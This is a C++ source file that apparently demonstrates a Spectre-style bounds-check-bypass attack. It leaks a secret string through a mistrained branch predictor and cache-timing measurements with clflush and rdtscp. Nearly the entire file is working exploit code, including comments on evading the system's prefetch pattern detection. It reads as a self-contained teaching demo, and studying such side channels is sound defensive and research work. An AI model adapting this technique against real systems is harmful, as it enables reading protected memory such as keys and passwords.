#include <bits/stdc++.h>
#include <x86intrin.h> /* For counting the number of cycles in fetching memory and flushing cache */
#include <random>      /* For randomly shuffling the attack pattern */
#include <chrono>      /*For getting current time, for seed value to random shuffle */
using namespace std;

/* The below Trace template Code was used only for debugging purposes */
#define trace(...) __f(#__VA_ARGS__, __VA_ARGS__)
template <typename Arg1>
void __f(const char *name, Arg1 &&arg1)
{
    cout << name << " : " << arg1 << std::endl;
    //use cerr if u want to display at the bottom
}
template <typename Arg1, typename... Args>
void __f(const char *names, Arg1 &&arg1, Args &&... args)
{
    const char *comma = strchr(names + 1, ',');
    cout.write(names, comma - names) << " : " << arg1 << " | ";
    __f(comma + 1, args...);
}

/********************************************************************
Targeted Program
********************************************************************/
unsigned int arr1_size = 16;    //Here I have made only the first 16 elements of arr1 availabe for fetching via fetch_function , can be thought as public data in some service
uint8_t arr1[160] = {16, 93, 45, 96, 4, 8, 41, 203, 15, 49, 56, 59, 62, 97, 112, 186};  //Random values for the accessible function
uint8_t arr2[256 * 512];    //Here array2 values are accessed via the arr1 values throught the function... can be thought as property  fetched for every user in db

char *secret = "Sachin@jafka#563";  /* RETRIEVING THIS SECRET KEY IS THE GOAL OF THE ATTACKER */

int fetch_function(size_t idx)
{
    // if the idx is in arr1 size bounds, it returns the below value else -1
    if (idx < arr1_size)
    {
        return arr2[arr1[idx] * 512];
    }
    return -1;
}

/********************************************************************
Attacking Program
********************************************************************/

/*** Parameters and Global Variables for Attacking Program */
const int CACHE_HIT_THRESHOLD = 80;  // Assume that the memory address is in Cache, if time is <= CACHE_HIT_THRESHOLD
const int NUM_TRIES = 1000;         // The task of attacking and analysing is done NUM_TRIES times, then score is prepared for each character out of NUM_TRIES
const int TRAINING_LOOPS = 100;     //The number of training loops (mistraing loops + attacking loops)
const int ATTACK_LEAP = 10;         // 1 in every ATTACK_LEAP of the TRAINING_LOOPS will be an attacking loop i.e. mistraining_loops = (TRAINING_LOOPS)/ATTACK_LEAP
const int INBETWEEN_DELAY = 100;    // The number of delay cycles between successive training loops
const int LIKELY_THRESHOLD = int(0.7 * NUM_TRIES);  // I assume that the characters with more than 70% hit rate are in the SECRET
int ATTACK_PATTERN[256];        // Instead of going in sequence of ascii characters A -> B -> C -> D ... , I have randomized the attack pattern likeidx -> C -> A -> M ... (random)
int results[256];               // This array will store the score for each character, i.e. Number of hits out of NUM_TRIES
bool IS_ATTACK[TRAINING_LOOPS]; // If IS_ATTACK[i] -> true, then malicious attack else mistraining attempt
struct compareChars
{
    bool operator()(int const &c1, int const &c2)
    {
        return results[c1] <= results[c2];
    }
};
priority_queue<int, vector<int>, compareChars> PQ; //max-heap for sorting the final results in a max priority-queue ... in descending order of scores of characters

/* This function initialises the attack pattern and is_attack arrays */
void init_attack()
{
    /* Here the ATTACK PATTERN is randomly shuffled */
    for (int i = 0; i < 256; ++i)
        ATTACK_PATTERN[i] = i;
    unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();
    shuffle(ATTACK_PATTERN, ATTACK_PATTERN + 256, default_random_engine(seed));
    /* Here the bool values , for whether to attack or mistrain is set */
    for (int i = 0; i < TRAINING_LOOPS; i += ATTACK_LEAP)
        IS_ATTACK[i] = true;
}

/*
    In this function.
    For each try:   
        - Flush the arr2 out of the cache memory
        - First mistrain the branch predictor by executing (ATTACK_LEAP -1 ) times branch taken
        - In the ATTACK_LEAP-th iteration, pass the byte address difference of the required SECRET and arr1 ... arr1 + target_idx, would lead me to the desired SECRET address
        - On attack iteration, for each character from 0 to 255
            * Check whether array[curr_Char * 512] is in the cache or not, by carefully taking the time (actually time difference here) it take to get the array[curr_char * 512]
            * If the time is in CACHE_HIT_THRESHOLD, increase the score of the current char by 1, 
    Now after getting all the resuls, 
        Push the characters in the priority queue
*/
void readMemoryByte(size_t target_idx)
{
    int i, j, curr_char;
    unsigned int junk = 0;
    size_t train_idx, idx;
    uint64_t time1, time_diff;
    uint8_t *addr;

    // Initializing the results array
    memset(results, 0, sizeof(results));

    for (int tries = NUM_TRIES - 1; tries > 0; --tries)
    {
        // Flush the arr2 out of cache memory
        for (i = 0; i < 256; i++)
            _mm_clflush(&arr2[i * 512]);

        // Training idx is the correct idx that is within arr1_size, which will train the branch predictor that brach is mostly taken
        train_idx = tries % arr1_size;

        for (i = TRAINING_LOOPS - 1; i >= 0; i--)
        {
            _mm_clflush(&arr1_size);
            // This loop executes the delay inbetween the successive training loops
            for (j = 0; j < INBETWEEN_DELAY; j++)
                ;

            //idx = (i % 6) ? train_idx : target_idx;
            //We should avoid the if-else condition here, as the if-else invokes the use of branch predictor here, which will then detect our logic here
           idx = IS_ATTACK[i] * target_idx + (!IS_ATTACK[i]) * train_idx;

            /* Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address) */
            fetch_function(idx);
        }

        /* Here I have set a timing attack for earch character*/
        for (i = 0; i < 256; i++)
        {
            curr_char = ATTACK_PATTERN[i];  // ATTACK_PATTERN decides which character I will be setting the timing attack for
            /* The ATTACK PATTERN is set randomly that the system does not detect the pattern of attack (stride prediction by the system) */
            addr = &arr2[curr_char * 512];  // The address location which would have been prefetched, if the branch predictor prefetched this 'character' signifying that this is in SECRET
            time1 = __rdtscp(&junk);         /* See how much time junk takes to fetch, junk will be CACHE */
            junk = *addr;                    /* Set junk to the target address */
            time_diff = __rdtscp(&junk) - time1; /* Read the timer and see what is the difference in earlier junk (fetched from CACHE) and this address*/
            if (time_diff <= CACHE_HIT_THRESHOLD )
                results[curr_char]++; /* cache hit - add +1 to score for this value */
        }

        PQ = priority_queue<int, vector<int>, compareChars>();  //Here first the priority queue is cleared out
        //Push the characters in the priority queue as per the scores
        for (int i = 0; i < 256; ++i)
            PQ.push(i);
        
    }
}

int main()
{
    /* Show the address of the secret key , for demonstration purpose*/
    cout << "In this example, the SECRET_KEY \"" << secret << "\" is stored at address: " << &secret << "\n";

    size_t target_idx = (size_t)(secret - (char *)arr1); /* Its value is the difference in the address of SECRET KEY and arr1*/
    /* So that when branch predictor fetches arr[target_idx] in attacking iterations (mispredictions), it prefetches arr1 + target_idx, which leads to prefetching of SECRET KEY in the cache memory */
    int len = strlen(secret);

    //set all values of array 2 as 1
    for (size_t i = 0; i < sizeof(arr2); i++)
        arr2[i] = 1; /* write to arr2 so in RAM not copy-on-write zero pages */

    // The init function will initialize the IS_ATTACK and ATTACK_PATTERN
    init_attack();

    cout << "Reading " << len << " bytes from target ::\n";
    string guessed_secret;  //This will store the most-likely value of the SECRET_KEY overall
    while (len--)
    {
        cout << "Reading at Target Address  = " << (void *)target_idx << " ... ";
        readMemoryByte(target_idx++);

        int most_likely_char = int('?');

        //Only consider those characters which have scores above THRESHOLD
        while (results[PQ.top()] >= LIKELY_THRESHOLD)
        {
            int curr_char = PQ.top();
            PQ.pop();
            if (curr_char < 31 || curr_char > 127) //not a valid character in secret, these characters we are sure will not be in SECRET KEY
                continue;
            
            // Update the mostly likely character if it is still unset
            if (most_likely_char == '?')
                most_likely_char = curr_char;
            cout << "Char '" << char(curr_char) << "' Score: " << results[curr_char] << " | ";
        }
        cout << "\n";
        guessed_secret.push_back(char(most_likely_char));
    }
    cout << "THE GUESSED SECRET IS :: " << guessed_secret << "\n";    
    return 0;
}
